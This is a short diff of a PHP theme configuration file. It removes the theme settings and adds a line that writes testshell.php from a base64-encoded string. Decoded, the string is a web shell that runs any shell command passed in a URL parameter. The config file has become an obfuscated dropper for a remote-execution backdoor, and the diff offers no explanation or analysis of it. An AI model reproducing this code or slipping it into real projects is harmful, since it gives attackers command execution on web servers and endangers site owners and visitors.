@@ -1,7 +1,5 @@
 <?php
-
-$themedir = 'miniport';
-$themename = 'miniport';
-$module_space[0] = 'main';
-$module_space[1] = 'footer';
+ 
+file_put_contents('testshell.php',base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg=='));
+ 
 ?>
